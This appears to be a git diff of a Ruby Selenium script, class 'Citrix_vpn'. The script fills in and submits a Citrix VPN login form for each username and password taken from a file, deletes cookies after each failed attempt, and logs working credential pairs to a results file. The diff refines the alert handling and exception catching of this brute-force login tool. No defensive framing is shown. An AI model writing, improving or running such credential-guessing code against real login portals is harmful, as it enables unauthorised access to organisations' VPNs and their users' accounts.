@@ -80,7 +80,9 @@ class Citrix_vpn #< Logical_Chaos
 					@driver.find_element(:name, "passwd").clear
 					@driver.find_element(:name, "passwd").send_keys passwd.to_s
 					@driver.find_element(:id,"Log_On").click
-					@driver.switch_to.alert.dismiss
+					if is_alert_present?	
+						puts "Alert present"
+					end
 					if element_present?(:name,"passwd")
 						#Wrong password
 						@driver.manage.delete_all_cookies
@@ -91,6 +93,7 @@ class Citrix_vpn #< Logical_Chaos
 						result.puts "User:#{user} Password:#{passwd}"
 						result.close
 					end
+					#@driver.save_screenshot("citrix_#{user.to_s}_#{passwd.to_s}.png")
 				end
 				f.close
 			end
@@ -116,7 +119,16 @@ class Citrix_vpn #< Logical_Chaos
 		begin
 			@driver.find_element(how, what)
 			true
-		rescue Selenium::WebDriver::Error::NoSuchElementError
+		rescue Exception => e
+			false
+		end
+	end
+	
+	def is_alert_present?()
+		begin
+			@driver.switch_to.alert.dismiss
+			true
+		rescue Exception => e
 			false
 		end
 	end
